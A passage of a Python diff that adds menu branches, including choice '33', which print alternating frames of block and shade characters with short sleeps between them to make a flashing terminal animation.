+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+
+
+        elif choice == '33':
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
